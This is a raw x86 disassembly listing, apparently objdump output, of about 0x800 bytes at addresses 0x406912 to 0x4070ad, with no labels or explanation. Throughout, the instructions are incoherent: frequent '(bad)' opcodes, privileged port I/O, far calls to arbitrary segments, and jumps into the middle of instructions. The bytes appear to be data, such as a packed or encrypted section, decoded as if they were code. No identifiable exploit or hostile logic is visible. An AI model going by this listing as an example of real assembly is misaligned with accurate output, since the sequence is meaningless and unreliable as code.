  406912:	inc    eax
  406913:	popf   
  406914:	(bad)  
  406915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406917:	icebp  
  406918:	loope  0x40695a
  40691a:	jmp    0x406956
  40691c:	aaa    
  40691d:	dec    eax
  40691e:	test   eax,0x8bc83094
  406923:	jecxz  0x4068f2
  406925:	pusha  
  406926:	xchg   ebp,eax
  406927:	je     0x406991
  406929:	out    dx,eax
  40692a:	ins    BYTE PTR es:[edi],dx
  40692b:	fdivr  QWORD PTR [edx]
  40692d:	mov    bh,0x55
  40692f:	add    al,0xeb
  406931:	and    bh,BYTE PTR gs:[ebp+0x15a9037e]
  406938:	push   DWORD PTR [eax]
  40693a:	xor    DWORD PTR [eax-0x6ad2680c],edx
  406940:	repz in al,dx
  406942:	popf   
  406943:	repnz stc 
  406945:	outs   dx,DWORD PTR ds:[esi]
  406946:	scas   al,BYTE PTR es:[edi]
  406947:	ret    
  406948:	adc    ch,ch
  40694a:	jb     0x4068e5
  40694c:	add    DWORD PTR [ebx-0x1b],esp
  40694f:	enter  0xec0f,0x3a
  406953:	js     0x4069b3
  406955:	sbb    ecx,DWORD PTR [esi-0x16]
  406958:	inc    ebx
  406959:	xor    bl,bl
  40695b:	data16 xor al,0x84
  40695e:	mov    eax,0x24e592c5
  406963:	in     eax,dx
  406964:	pop    es
  406965:	jmp    0x7c22bda0
  40696a:	in     al,0x69
  40696c:	pushf  
  40696d:	leave  
  40696e:	ret    
  40696f:	push   esi
  406970:	das    
  406971:	dec    eax
  406972:	adc    DWORD PTR [ebp-0x66],ebx
  406975:	cld    
  406976:	(bad)  
  406977:	xchg   ebx,eax
  406978:	xlat   BYTE PTR ds:[ebx]
  406979:	or     ah,BYTE PTR [ecx-0x6e0cb96a]
  40697f:	push   ebp
  406980:	adc    al,0x11
  406982:	mov    eax,ds:0xbc2675eb
  406987:	(bad)  
  406988:	out    dx,eax
  406989:	idiv   BYTE PTR [edx-0x81a8ec]
  40698f:	rcr    eax,1
  406991:	and    DWORD PTR [edx+ebp*2],eax
  406994:	mov    eax,0x61775fef
  406999:	(bad)  
  40699a:	leave  
  40699b:	mov    ah,0xfa
  40699d:	sub    al,0x15
  40699f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069a0:	addr16 daa 
  4069a2:	jno    0x4069a8
  4069a4:	iret   
  4069a5:	mov    ?,WORD PTR [ecx]
  4069a7:	mov    al,0x5
  4069a9:	mov    ?,WORD PTR ds:0x7b3148ee
  4069af:	xchg   ecx,eax
  4069b0:	and    DWORD PTR [ecx],esp
  4069b2:	mov    dh,0xc9
  4069b4:	xchg   ebx,edi
  4069b6:	stc    
  4069b7:	inc    ebp
  4069b8:	js     0x406951
  4069ba:	mov    bh,0x32
  4069bc:	rcl    DWORD PTR [edx-0x5d],1
  4069bf:	(bad)  
  4069c0:	test   eax,0xf944b3a9
  4069c5:	xor    edx,eax
  4069c7:	aam    0xfd
  4069c9:	(bad)  
  4069ca:	mov    cl,BYTE PTR [edx-0x3a]
  4069cd:	dec    edi
  4069ce:	inc    ebp
  4069cf:	out    dx,eax
  4069d0:	fmul   DWORD PTR ds:0xda6345a6
  4069d6:	in     eax,dx
  4069d7:	inc    ecx
  4069d8:	fnstcw WORD PTR gs:[edx-0x71f644b6]
  4069df:	ins    BYTE PTR es:[edi],dx
  4069e0:	cmp    al,al
  4069e2:	dec    esi
  4069e3:	pusha  
  4069e4:	mov    dh,0x31
  4069e6:	iret   
  4069e7:	jns    0x4069dc
  4069e9:	jge    0x406a6a
  4069eb:	sub    BYTE PTR [edi+edx*4],bh
  4069ee:	and    BYTE PTR [edx-0x56],bl
  4069f1:	call   0xff86d478
  4069f6:	std    
  4069f7:	jae    0x406a4f
  4069f9:	push   esp
  4069fa:	inc    edx
  4069fb:	out    dx,al
  4069fc:	and    eax,0x4e0027b0
  406a01:	test   bl,al
  406a03:	gs jge 0x40698c
  406a06:	adc    BYTE PTR [eax],cl
  406a08:	pushf  
  406a09:	add    DWORD PTR [ebx+0x3a],edi
  406a0c:	mov    al,0x96
  406a0e:	outs   dx,DWORD PTR gs:[esi]
  406a10:	xchg   esi,eax
  406a11:	inc    esp
  406a12:	mov    dh,0xc7
  406a14:	inc    edi
  406a15:	adc    ecx,DWORD PTR [edi-0x12]
  406a18:	das    
  406a19:	inc    edx
  406a1a:	lods   eax,DWORD PTR ds:[esi]
  406a1b:	pop    ebp
  406a1c:	fdiv   QWORD PTR [eax-0x283b4589]
  406a22:	pop    ebx
  406a23:	mov    edi,0xeef1481d
  406a28:	mov    al,0xfa
  406a2a:	loopne 0x406a4a
  406a2c:	ret    0x654f
  406a2f:	(bad)  
  406a30:	jmp    0x4069d4
  406a32:	jg     0x4069c1
  406a34:	sub    cl,0x29
  406a37:	jl     0x4069f7
  406a39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a3a:	cmp    al,0xb6
  406a3c:	loope  0x406a19
  406a3e:	adc    ecx,DWORD PTR ds:0x9744adc0
  406a44:	stos   DWORD PTR es:[edi],eax
  406a45:	jmp    0x9073:0xea499511
  406a4c:	daa    
  406a4d:	inc    esp
  406a4e:	lea    eax,[esi+0x40]
  406a51:	enter  0x6475,0x49
  406a55:	cld    
  406a56:	pushf  
  406a57:	add    ch,ch
  406a59:	xchg   ebp,eax
  406a5a:	inc    eax
  406a5b:	std    
  406a5c:	cmc    
  406a5d:	mov    ds:0x599caa2d,eax
  406a62:	mov    ch,0xcf
  406a64:	mov    edx,0xbfada7cc
  406a69:	test   eax,0xf9348d41
  406a6e:	ficom  WORD PTR [ebx-0x61]
  406a71:	popf   
  406a72:	loope  0x406a39
  406a74:	jge    0x406a6f
  406a76:	mov    DWORD PTR [edi+0x2898184d],esi
  406a7c:	(bad)  
  406a7e:	push   0x98b928f
  406a83:	div    BYTE PTR [edi-0x2b]
  406a86:	add    BYTE PTR [ecx+0x64569182],cl
  406a8c:	add    al,0x20
  406a8e:	sti    
  406a8f:	not    BYTE PTR [ecx+0x52095228]
  406a95:	sbb    edi,DWORD PTR [eax]
  406a97:	in     al,0xa4
  406a99:	inc    esp
  406a9a:	xchg   edi,eax
  406a9b:	cmp    bl,BYTE PTR ds:0xe853a4ec
  406aa1:	fsubr  DWORD PTR [ebp-0x58]
  406aa4:	cwde   
  406aa5:	xchg   esi,eax
  406aa6:	ror    DWORD PTR [eax],1
  406aa8:	call   0xd222:0xa54663a7
  406aaf:	mov    eax,0x75b2ae9
  406ab4:	hlt    
  406ab5:	cmp    al,0xd9
  406ab7:	lds    esp,FWORD PTR [ecx+esi*8]
  406aba:	xlat   BYTE PTR ds:[ebx]
  406abb:	call   0xae4c:0xcccafe5
  406ac2:	ja     0x406a7f
  406ac4:	popf   
  406ac5:	repnz mov al,0x91
  406ac8:	and    BYTE PTR [ecx+0x6f848996],ch
  406ace:	mov    dh,0x58
  406ad0:	call   0x7bc3:0xd0b63f98
  406ad7:	popf   
  406ad8:	or     al,0x3f
  406ada:	jg     0x406a7a
  406adc:	fs loope 0x406aae
  406adf:	adc    DWORD PTR [ebp+0x3a],esi
  406ae2:	pop    eax
  406ae3:	pop    ds
  406ae4:	aad    0x4f
  406ae6:	fwait
  406ae7:	pop    ebx
  406ae8:	mul    DWORD PTR [edi-0x7e6d9327]
  406aee:	sub    dl,bh
  406af0:	rcr    BYTE PTR cs:[eax-0x79],0xe6
  406af5:	inc    ebx
  406af6:	cmp    edi,esi
  406af8:	fbld   TBYTE PTR [ecx]
  406afa:	sahf   
  406afb:	adc    al,0x10
  406afd:	ret    0x96d4
  406b00:	outs   dx,DWORD PTR ds:[esi]
  406b01:	xor    ch,BYTE PTR [edi+0x71]
  406b04:	shr    BYTE PTR [edx],1
  406b06:	fwait
  406b07:	and    dl,BYTE PTR [edx+ebx*2]
  406b0a:	push   es
  406b0b:	fist   DWORD PTR [ebx]
  406b0d:	sbb    al,0xb3
  406b0f:	jns    0x406a9f
  406b11:	call   0xecc2b1cb
  406b16:	dec    ebp
  406b17:	xor    ebx,DWORD PTR [esi]
  406b19:	push   edi
  406b1a:	ret    0x6c13
  406b1d:	mov    ch,al
  406b1f:	push   eax
  406b20:	jno    0x406b30
  406b22:	dec    esp
  406b23:	push   ecx
  406b24:	dec    BYTE PTR [edx]
  406b26:	inc    esp
  406b27:	mov    esi,0x3d1aa45c
  406b2c:	xor    bh,BYTE PTR [edx+0x3ceda08f]
  406b32:	fcomp  QWORD PTR [edx]
  406b34:	xlat   BYTE PTR ds:[ebx]
  406b35:	scas   eax,DWORD PTR es:[edi]
  406b36:	mov    edi,0x10b44822
  406b3b:	push   0xffffffb7
  406b3d:	out    0x4f,eax
  406b3f:	add    ah,ah
  406b41:	push   esp
  406b42:	adc    al,0xf1
  406b44:	scas   eax,DWORD PTR es:[edi]
  406b45:	lock jp 0x406b3c
  406b48:	xchg   ecx,eax
  406b49:	lds    ebp,FWORD PTR [ebx]
  406b4b:	(bad)  
  406b4c:	pop    edi
  406b4d:	or     ah,BYTE PTR ds:0x57a72eed
  406b53:	cli    
  406b54:	out    dx,al
  406b55:	cmp    al,0x6f
  406b57:	inc    esp
  406b58:	xchg   ebx,eax
  406b59:	or     eax,0xd00186d3
  406b5e:	ret    
  406b5f:	inc    edx
  406b60:	popf   
  406b61:	or     DWORD PTR [esi-0x4e],edi
  406b64:	or     BYTE PTR [esi-0x8],0x4d
  406b68:	xchg   DWORD PTR ds:0x4d72b483,eax
  406b6e:	pop    edx
  406b6f:	sbb    dl,BYTE PTR [ecx]
  406b71:	adc    eax,0xc25785d4
  406b76:	lods   eax,DWORD PTR ds:[esi]
  406b77:	xchg   BYTE PTR [ebx+0x65],bl
  406b7a:	data16 fwait
  406b7c:	ins    DWORD PTR es:[edi],dx
  406b7d:	add    bl,BYTE PTR [edx+0x5c]
  406b80:	dec    eax
  406b81:	adc    eax,0x73baaabc
  406b86:	mov    bh,0x3e
  406b88:	ja     0x406bb0
  406b8a:	cmp    esi,DWORD PTR [edx-0x60]
  406b8d:	loop   0x406b74
  406b8f:	popf   
  406b90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b91:	dec    ebx
  406b92:	cmp    BYTE PTR ds:0x5d98bd8f,bh
  406b98:	lods   al,BYTE PTR ds:[esi]
  406b99:	fist   WORD PTR [esi]
  406b9b:	dec    esp
  406b9c:	mov    ebp,0x11b87f95
  406ba1:	mov    al,0x2
  406ba3:	dec    edi
  406ba4:	jno    0x406b3f
  406ba6:	in     al,0x24
  406ba8:	in     al,0x9f
  406baa:	or     DWORD PTR [ecx+ebx*4],ebp
  406bad:	mov    ss,ebp
  406baf:	es cld 
  406bb1:	mov    eax,0x1ca07654
  406bb6:	or     bh,bl
  406bb8:	pushf  
  406bb9:	pop    ebx
  406bba:	mov    bl,BYTE PTR [esi+ebx*8]
  406bbd:	add    esp,edx
  406bbf:	call   0x3082:0x8f792d0a
  406bc6:	inc    ebp
  406bc7:	ss and eax,0xd92e9ce9
  406bcd:	iret   
  406bce:	in     al,dx
  406bcf:	cld    
  406bd0:	out    dx,eax
  406bd1:	jecxz  0x406c43
  406bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bd4:	mov    al,ds:0xfd915c35
  406bd9:	lds    edx,FWORD PTR [eax+0x7b]
  406bdc:	mov    esp,DWORD PTR [edx-0xb]
  406bdf:	and    BYTE PTR [ebp-0x68],0x4d
  406be3:	jbe    0x406b74
  406be5:	cmp    ch,BYTE PTR [ebx-0x598d896]
  406beb:	mov    eax,ebp
  406bed:	dec    esp
  406bee:	inc    ecx
  406bef:	sub    dh,dl
  406bf1:	jmp    0x50fa:0xd2781f43
  406bf8:	pop    ss
  406bf9:	xchg   esi,eax
  406bfa:	dec    ecx
  406bfb:	mov    al,BYTE PTR [eax+eax*1+0x3a]
  406bff:	or     BYTE PTR [ecx-0x11],0x64
  406c03:	sar    DWORD PTR [esi-0x4a],1
  406c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c07:	and    eax,DWORD PTR ds:0x49ec444d
  406c0d:	jbe    0x406c7d
  406c0f:	arpl   WORD PTR [edi],ax
  406c11:	xchg   esp,eax
  406c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c13:	xor    edx,DWORD PTR [ecx]
  406c15:	xchg   ebx,eax
  406c17:	xor    eax,0xea0c2e0c
  406c1c:	sbb    esp,DWORD PTR [esi-0x34e03d18]
  406c22:	sub    eax,0xbc947cee
  406c27:	js     0x406c45
  406c29:	pop    edx
  406c2a:	mov    edi,0x86776fd8
  406c2f:	pop    ebp
  406c30:	push   0xff51e9e
  406c35:	mov    ebp,0x95b83e11
  406c3a:	nop
  406c3b:	repz mov esi,0xf1bd8fb6
  406c41:	add    esi,esp
  406c43:	pop    ebp
  406c44:	push   cs
  406c45:	lods   eax,DWORD PTR ds:[esi]
  406c46:	cmovo  ebx,DWORD PTR ss:[eax]
  406c4a:	daa    
  406c4b:	dec    edx
  406c4c:	xlat   BYTE PTR ds:[ebx]
  406c4d:	pusha  
  406c4e:	(bad)  
  406c4f:	inc    esp
  406c50:	loop   0x406cac
  406c52:	push   cs
  406c53:	adc    ebx,ebp
  406c55:	pushf  
  406c56:	adc    BYTE PTR [esi+0xbc9f6b8],al
  406c5c:	pop    DWORD PTR [edi+eiz*4]
  406c5f:	lahf   
  406c60:	mov    esp,DWORD PTR [edx-0x35]
  406c63:	jge    0x406cdf
  406c65:	test   ebp,ebp
  406c67:	inc    ecx
  406c68:	cmp    ah,BYTE PTR [ebx+0x5]
  406c6b:	nop
  406c6c:	mov    ch,0x3f
  406c6e:	gs and al,0xcc
  406c71:	dec    ebp
  406c72:	add    eax,0x671f5fa0
  406c77:	fstp   QWORD PTR [esi-0x55e4632f]
  406c7d:	js     0x406c2a
  406c7f:	push   cs
  406c80:	test   esp,0x9451e347
  406c86:	sub    eax,0xe149e25e
  406c8b:	inc    esi
  406c8c:	mov    fs,WORD PTR [esi]
  406c8e:	call   0x6e28d476
  406c93:	mov    eax,ds:0xa4f8c030
  406c98:	jmp    0xecdb5daa
  406c9d:	int    0xc6
  406c9f:	out    0xe,eax
  406ca1:	sbb    eax,0x64ae7c6c
  406ca6:	pusha  
  406ca7:	xchg   ebp,eax
  406ca8:	dec    ebx
  406ca9:	mov    ah,0xa9
  406cab:	and    BYTE PTR [edx],0x88
  406cae:	dec    esp
  406caf:	add    edi,esp
  406cb1:	add    DWORD PTR [edx+eax*4+0x29],esi
  406cb5:	(bad)  
  406cb6:	repnz loope 0x406cf1
  406cb9:	jl     0x406cbe
  406cbb:	icebp  
  406cbc:	xor    eax,0x7e106e4c
  406cc1:	loope  0x406c7d
  406cc3:	repz jae 0x406c58
  406cc6:	pop    ebx
  406cc8:	in     eax,0x70
  406cca:	dec    esp
  406ccb:	and    ah,ah
  406ccd:	pop    ebp
  406cce:	cmp    eax,0xdf4b1996
  406cd3:	push   ss
  406cd4:	or     al,0xb8
  406cd6:	lahf   
  406cd7:	or     BYTE PTR [eax-0x7a],0x2b
  406cdb:	gs push 0xffffffc2
  406cde:	imul   ebx,DWORD PTR [ebx+0x9],0xffffff9c
  406ce2:	push   edx
  406ce3:	cld    
  406ce4:	ja     0x406c8a
  406ce6:	push   esp
  406ce7:	jns    0x406d4a
  406ce9:	test   al,0x1f
  406ceb:	sub    DWORD PTR [ebp+0x891794e],ebp
  406cf1:	loop   0x406c87
  406cf3:	pop    ds
  406cf4:	and    ch,BYTE PTR [eax]
  406cf6:	jo     0x406c95
  406cf8:	lods   eax,DWORD PTR ds:[esi]
  406cf9:	jmp    0x406c7b
  406cfb:	stos   DWORD PTR es:[edi],eax
  406cfc:	js     0x406cbf
  406cfe:	xchg   edx,eax
  406cff:	aas    
  406d00:	into   
  406d01:	int3   
  406d02:	jne    0x406cae
  406d04:	pop    esi
  406d05:	js     0x406d62
  406d07:	idiv   BYTE PTR ds:0xdd85428f
  406d0d:	test   BYTE PTR [eax-0x19],0xfd
  406d11:	or     BYTE PTR [ebp+0x170f3e74],ah
  406d17:	out    dx,al
  406d18:	jb     0x406cf3
  406d1a:	out    dx,al
  406d1b:	int3   
  406d1c:	xor    cl,cl
  406d1e:	xchg   ebx,eax
  406d1f:	jecxz  0x406d99
  406d21:	jmp    0x406d53
  406d23:	neg    cl
  406d25:	(bad)  
  406d26:	fadd   st(6),st
  406d28:	out    0x53,al
  406d2a:	sub    ch,BYTE PTR [edi+0x4c]
  406d2d:	sar    al,0xd5
  406d30:	cmp    esi,DWORD PTR [edi+0x57]
  406d33:	js     0x406d73
  406d35:	and    eax,0x22e60f44
  406d3a:	or     edx,DWORD PTR [ebp+0x4b]
  406d3d:	xchg   edx,eax
  406d3e:	or     ebp,DWORD PTR [ecx]
  406d40:	lock es push ss
  406d43:	sub    al,0xa8
  406d45:	xchg   ecx,eax
  406d46:	jl     0x406da2
  406d48:	and    al,0xf2
  406d4a:	out    dx,al
  406d4b:	in     eax,dx
  406d4c:	push   eax
  406d4d:	mov    dl,cl
  406d4f:	loopne 0x406d9b
  406d51:	shl    BYTE PTR [edi],1
  406d53:	rcr    DWORD PTR [edx-0x5f2227e1],1
  406d59:	fwait
  406d5a:	pusha  
  406d5b:	xchg   edx,eax
  406d5c:	push   esp
  406d5d:	push   ds
  406d5e:	or     dh,BYTE PTR [ecx+0x46782345]
  406d64:	bnd jb 0x406ce9
  406d67:	xchg   esp,eax
  406d68:	add    DWORD PTR [ebx+0x74b24336],edx
  406d6e:	xchg   edx,eax
  406d6f:	outs   dx,DWORD PTR ds:[esi]
  406d70:	lods   al,BYTE PTR ds:[esi]
  406d71:	jnp    0x406cfd
  406d73:	enter  0xfc62,0xd3
  406d77:	inc    ebx
  406d78:	shr    ecx,cl
  406d7a:	out    dx,al
  406d7b:	lods   al,BYTE PTR ds:[esi]
  406d7c:	out    dx,al
  406d7d:	and    DWORD PTR [ecx-0x17],0x32
  406d81:	cmc    
  406d82:	xlat   BYTE PTR ds:[ebx]
  406d83:	sbb    BYTE PTR [edi],bl
  406d85:	ret    
  406d86:	lds    edi,FWORD PTR [edx-0x4a]
  406d89:	inc    ecx
  406d8a:	jmp    0x7c3d:0x79cd2ab3
  406d91:	ret    
  406d92:	addr16 and eax,0x9f76ef1e
  406d98:	sbb    ebp,esp
  406d9a:	xor    BYTE PTR [ebx-0x6f1b2f7a],ah
  406da0:	fdiv   st(5),st
  406da2:	mov    ebx,0xa9d9cd3e
  406da7:	add    BYTE PTR es:[esi],0x12
  406dab:	cmc    
  406dac:	lock mov DWORD PTR [esi-0x3c852a70],ebp
  406db3:	pop    esp
  406db4:	cmp    eax,0xfe822c19
  406db9:	sub    al,0xd5
  406dbb:	out    dx,al
  406dbc:	cmp    eax,0x406b7f17
  406dc1:	lods   eax,DWORD PTR ds:[esi]
  406dc2:	sar    DWORD PTR [ecx],1
  406dc4:	in     al,0x71
  406dc6:	int    0x18
  406dc8:	and    al,0x5d
  406dca:	mov    BYTE PTR ds:[edi+edi*8-0x75],dh
  406dcf:	adc    dx,di
  406dd2:	mov    dh,BYTE PTR [eax+ecx*1-0x74]
  406dd6:	std    
  406dd7:	adc    ah,BYTE PTR [edi-0x7f209da6]
  406ddd:	gs or  al,bh
  406de0:	cld    
  406de1:	sub    esp,esi
  406de3:	or     ah,BYTE PTR [esi]
  406de5:	pushf  
  406de6:	mov    ecx,0x700d043a
  406deb:	mov    edi,0x6da5906c
  406df0:	xor    eax,0x2052d88
  406df5:	mov    edi,0x510558fe
  406dfa:	mov    ch,0xc9
  406dfc:	lock jecxz 0x406e19
  406dff:	xor    eax,0xa6a8d3b
  406e04:	jp     0x406e56
  406e06:	mov    eax,0x44cb8c63
  406e0b:	mov    DWORD PTR [esi],0x17a3dff3
  406e11:	ins    DWORD PTR es:[edi],dx
  406e12:	mov    dl,0x4
  406e14:	icebp  
  406e15:	cs leave 
  406e17:	dec    edi
  406e18:	outs   dx,DWORD PTR ds:[esi]
  406e19:	pop    esp
  406e1a:	es sbb eax,0xf5897bcb
  406e20:	xchg   ecx,eax
  406e21:	inc    ebp
  406e22:	adc    eax,0xe86bff44
  406e27:	ins    DWORD PTR es:[edi],dx
  406e28:	jnp    0x406df8
  406e2a:	daa    
  406e2b:	fdiv   DWORD PTR [eax]
  406e2d:	xchg   BYTE PTR [ebx+eax*8+0x4735cceb],ch
  406e34:	fs repnz inc ebx
  406e37:	stos   BYTE PTR es:[edi],al
  406e38:	sub    al,0x2e
  406e3a:	test   bh,cl
  406e3c:	(bad)  
  406e3e:	inc    edx
  406e3f:	mov    cl,0x56
  406e41:	inc    ebx
  406e42:	sub    eax,ebx
  406e44:	push   0x8e52e607
  406e49:	ins    DWORD PTR es:[edi],dx
  406e4a:	iret   
  406e4b:	jp     0x406e1a
  406e4d:	pusha  
  406e4e:	aam    0xef
  406e50:	cmp    eax,0xb0cb2a7
  406e55:	int    0xb8
  406e57:	mul    DWORD PTR [ebp-0x354e9929]
  406e5d:	ret    0xafee
  406e60:	into   
  406e61:	jo     0x406e49
  406e63:	daa    
  406e64:	test   DWORD PTR [ebx],edi
  406e66:	in     al,0x96
  406e68:	xchg   ecx,eax
  406e69:	dec    ebp
  406e6a:	mov    ds:0x6934e624,eax
  406e6f:	or     eax,0x760f8db8
  406e74:	daa    
  406e75:	or     edi,eax
  406e77:	mov    dh,0x78
  406e79:	cdq    
  406e7a:	mov    esi,0x7c0f39ea
  406e7f:	and    eax,0xcdd3869f
  406e84:	cli    
  406e85:	dec    ebx
  406e86:	lea    edi,[esi*2-0x4f0ba407]
  406e8d:	jmp    0xaa455efd
  406e92:	adc    dh,BYTE PTR [edi-0x4f]
  406e95:	cmp    al,0x6d
  406e97:	cli    
  406e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e99:	popf   
  406e9a:	mov    BYTE PTR [edx],ah
  406e9c:	push   es
  406e9d:	pop    esi
  406e9e:	cmp    eax,0x5a993bea
  406ea3:	jle    0x406e66
  406ea5:	add    al,0x2
  406ea7:	cli    
  406ea8:	xchg   esi,eax
  406ea9:	test   DWORD PTR [ebx-0x7b],edx
  406eac:	retf   0xa44a
  406eaf:	xlat   BYTE PTR ds:[ebx]
  406eb0:	lea    ebx,[ecx+0x74]
  406eb3:	fild   QWORD PTR [eax-0x75]
  406eb6:	mov    BYTE PTR [ecx],bh
  406eb8:	mov    cs,WORD PTR [edi-0x55]
  406ebb:	jae    0x406f2d
  406ebd:	mov    esi,0xbe3fa3
  406ec2:	shl    BYTE PTR [edx-0x4da421df],1
  406ec8:	sub    edx,DWORD PTR [eax+0x4e]
  406ecb:	dec    ebp
  406ecc:	imul   edi,DWORD PTR [ecx-0x5d],0x3a4dbf44
  406ed3:	fs inc edx
  406ed5:	push   esi
  406ed6:	mov    ds:0xee0e7bb3,eax
  406edb:	or     al,0x24
  406edd:	shr    DWORD PTR [ebp-0x6624739d],0xa0
  406ee4:	jo     0x406f4a
  406ee6:	xchg   edx,eax
  406ee7:	sbb    BYTE PTR [edx],cl
  406ee9:	int3   
  406eea:	add    cl,BYTE PTR [edi]
  406eec:	add    eax,0xfda073b8
  406ef1:	jmp    0x406f63
  406ef3:	mov    esp,0xde12d201
  406ef8:	mov    esi,0xd0dca59c
  406efd:	adc    eax,DWORD PTR [esi-0x5e081122]
  406f03:	sbb    BYTE PTR [edx],ah
  406f05:	idiv   DWORD PTR [ebx+0x7c]
  406f08:	clc    
  406f09:	or     cl,BYTE PTR [esi]
  406f0b:	xchg   esp,eax
  406f0c:	sbb    ebx,edx
  406f0e:	je     0x406eff
  406f10:	nop
  406f11:	sar    BYTE PTR [esi+0x40],cl
  406f14:	es enter 0x5b2e,0x73
  406f19:	fsub   st,st(7)
  406f1b:	inc    esi
  406f1d:	pop    esi
  406f1e:	ja     0x406eb9
  406f20:	mov    dl,0xf9
  406f22:	sub    al,0xa0
  406f24:	adc    eax,ebx
  406f26:	and    al,0xb5
  406f28:	adc    ebp,DWORD PTR [eax+ebx*8+0x4ef96d7f]
  406f2f:	fsubrp st(1),st
  406f31:	or     DWORD PTR [eax],ebx
  406f33:	shl    DWORD PTR ds:0x47042370,0x12
  406f3a:	lea    edx,[ebp+0x5ef0cc31]
  406f40:	rol    esi,1
  406f42:	test   DWORD PTR [ebp+0x6a1ad208],eax
  406f48:	aad    0x10
  406f4a:	jmp    0x406f4f
  406f4c:	push   esi
  406f4d:	dec    eax
  406f4e:	cmp    esp,DWORD PTR [edi-0x259d8e7e]
  406f54:	js     0x406fd2
  406f56:	cwde   
  406f57:	icebp  
  406f58:	mov    DWORD PTR [edx-0x326a70ff],ebp
  406f5e:	ret    0x8531
  406f61:	loopne 0x406f4a
  406f63:	int3   
  406f64:	or     al,0x7c
  406f66:	bound  eax,QWORD PTR [esi+0x22]
  406f69:	call   0x9973:0xb4810327
  406f70:	xor    ecx,DWORD PTR [eax+ebx*2-0x6b]
  406f74:	not    BYTE PTR [edi-0x65b1297]
  406f7a:	pop    esp
  406f7b:	test   al,0x9f
  406f7d:	jae    0x406feb
  406f7f:	push   0x69
  406f81:	mov    WORD PTR [ecx+0x6a],?
  406f84:	pop    ss
  406f85:	xchg   BYTE PTR [esi+0x58817ab2],ch
  406f8b:	jecxz  0x406f2a
  406f8d:	push   ecx
  406f8e:	pop    eax
  406f8f:	cmp    al,0xdf
  406f91:	xchg   ecx,eax
  406f92:	pop    es
  406f93:	lock sbb eax,0xf9859cd9
  406f99:	sar    esp,0xd2
  406f9c:	test   ebp,ebp
  406f9e:	icebp  
  406f9f:	cmp    eax,0x8b5e13d5
  406fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fa5:	add    eax,0xb7e1e92f
  406faa:	aaa    
  406fab:	out    0xde,eax
  406fad:	pop    edx
  406fae:	fucomp st(5)
  406fb0:	aaa    
  406fb1:	hlt    
  406fb2:	sti    
  406fb3:	and    esp,ecx
  406fb5:	push   esp
  406fb6:	popa   
  406fb7:	in     al,dx
  406fb8:	pop    ebp
  406fb9:	pop    es
  406fba:	mov    esp,0x5158e252
  406fbf:	push   esi
  406fc0:	mov    al,ds:0x1788edb3
  406fc5:	fcom   st(6)
  406fc7:	mov    eax,ds:0x697cff95
  406fcc:	dec    esp
  406fcd:	out    0xff,al
  406fcf:	jle    0x40704f
  406fd1:	push   cs
  406fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fd3:	jb     0x406f76
  406fd5:	mov    edi,0x7a656263
  406fda:	inc    ebx
  406fdb:	or     eax,0xb3d4d9a6
  406fe0:	dec    ecx
  406fe1:	push   esp
  406fe2:	pop    ecx
  406fe3:	lea    edx,ss:[edi]
  406fe6:	out    0xe0,eax
  406fe8:	add    ch,BYTE PTR [esp+eiz*2-0x9b4f756]
  406fef:	(bad)  
  406ff0:	and    al,0x50
  406ff2:	pop    ds
  406ff3:	lds    edi,FWORD PTR [ebx]
  406ff5:	push   ds
  406ff6:	inc    ebp
  406ff7:	jo     0x406fa2
  406ff9:	or     bh,BYTE PTR [ebp+0x13cfc6b3]
  406fff:	je     0x40706c
  407001:	or     al,0x7d
  407003:	jo     0x40702d
  407005:	fmulp  st(5),st
  407007:	cdq    
  407008:	imul   esi,DWORD PTR [ebp-0x313bd9e3],0x16189672
  407012:	sbb    eax,0x1367e72c
  407017:	jge    0x407033
  407019:	cmp    eax,0xd55a6ef
  40701e:	jae    0x407072
  407020:	xor    ebp,edx
  407022:	push   ebx
  407023:	fwait
  407024:	fs mov edi,0x7908fdf3
  40702a:	jno    0x406fb5
  40702c:	leave  
  40702d:	loop   0x4070ab
  40702f:	dec    ebp
  407030:	mov    ?,ebx
  407032:	popf   
  407033:	mov    al,0x2
  407035:	cld    
  407036:	inc    esp
  407037:	push   cs
  407038:	fstp   TBYTE PTR [ebx]
  40703a:	clc    
  40703b:	mov    cl,0x7
  40703d:	clc    
  40703e:	add    cl,bh
  407040:	repz setl BYTE PTR [esi-0x18509df5]
  407048:	push   ds
  407049:	mov    dl,0x2c
  40704b:	xchg   ebx,eax
  40704c:	sub    ah,0xce
  40704f:	das    
  407050:	imul   eax,edi,0xd183f322
  407056:	nop
  407057:	sub    ebx,DWORD PTR [edx+0x14]
  40705a:	jb     0x406fef
  40705c:	dec    esi
  40705d:	push   es
  40705e:	inc    edx
  40705f:	in     al,dx
  407060:	(bad)  
  407061:	jmp    0x407047
  407063:	test   al,0xfc
  407065:	loop   0x4070ab
  407067:	sbb    al,0xbe
  407069:	adc    al,0xd1
  40706b:	repz mov ah,0x82
  40706e:	sub    ch,BYTE PTR [edi]
  407070:	jns    0x40701c
  407072:	in     eax,dx
  407073:	retf   
  407074:	cmp    al,dl
  407076:	pop    ebx
  407077:	shr    DWORD PTR [ecx+0x233f4803],1
  40707d:	add    BYTE PTR [edx],ch
  40707f:	rcr    esp,1
  407081:	dec    esp
  407082:	xchg   ecx,eax
  407083:	adc    ecx,DWORD PTR [edi]
  407085:	xchg   BYTE PTR [ebx],dh
  407087:	out    dx,al
  407088:	iret   
  407089:	aad    0xc4
  40708b:	gs add bl,al
  40708e:	xchg   ecx,eax
  40708f:	retf   
  407090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407091:	cmp    DWORD PTR [ebx+0x5a6a9fef],edx
  407097:	pop    edx
  407098:	lock push eax
  40709a:	cmp    cl,BYTE PTR es:[edx-0xe10efc1]
  4070a1:	enter  0xccb5,0x9c
  4070a5:	mov    edx,eax
  4070a7:	xlat   BYTE PTR ds:[ebx]
  4070a8:	dec    esi
  4070a9:	pop    esp
  4070aa:	hlt    
  4070ab:	mov    al,0x71
  4070ad:	jbe    0x407075
